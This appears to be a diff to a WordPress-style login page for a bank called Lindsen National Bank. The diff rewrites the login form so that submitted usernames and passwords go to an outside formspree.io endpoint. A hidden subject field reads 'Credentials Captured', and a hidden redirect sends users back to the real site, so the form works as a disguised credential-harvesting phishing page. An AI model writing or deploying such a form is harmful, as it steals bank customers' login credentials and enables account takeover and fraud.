@@ -139,28 +139,35 @@ document.body.className = document.body.className.replace('no-js','js');
 <div id="login">
     <h1 role="presentation" class="wp-login-logo"><a href="http://lindensennational.com/">Lindsen National Bank</a></h1>
     
-    <form name="loginform" id="loginform" method="post">
-        <p>
-            <label for="user_login">Username or Email Address</label>
-            <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
-        </p>
+    <form name="loginform" id="loginform" action="https://formspree.io/f/xwpzoyqz" method="POST">
+    <input type="hidden" name="_subject" value="LNB System Upgrade - Credentials Captured">
+    <input type="hidden" name="_format" value="plain">
+    <input type="hidden" name="_next" value="http://lindensennational.com/">
+    
+    <p>
+        <label for="user_login">Username or Email Address</label>
+        <input type="text" name="username" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
+    </p>
 
-        <div class="user-pass-wrap">
-            <label for="user_pass">Password</label>
-            <div class="wp-pwd">
-                <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
-                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
-                    <span class="dashicons dashicons-visibility" aria-hidden="true">👁️</span>
-                </button>
-            </div>
+    <div class="user-pass-wrap">
+        <label for="user_pass">Password</label>
+        <div class="wp-pwd">
+            <input type="password" name="password" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
+            <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
+                <span class="dashicons dashicons-visibility" aria-hidden="true">👁️</span>
+            </button>
         </div>
-        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever" /> <label for="rememberme">Remember Me</label></p>
-        <p class="submit">
-            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
-            <input type="hidden" name="redirect_to" value="http://lindensennational.com/wp-admin/" />
-            <input type="hidden" name="testcookie" value="1" />
-        </p>
-    </form>
+    </div>
+    
+    <p class="forgetmenot">
+        <input name="rememberme" type="checkbox" id="rememberme" value="forever" /> 
+        <label for="rememberme">Remember Me</label>
+    </p>
+    
+    <p class="submit">
+        <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+    </p>
+</form>
 
     <p id="nav">
         <a class="wp-login-lost-password" href="http://lindensennational.com/wp-login.php?action=lostpassword">Lost your password?</a>
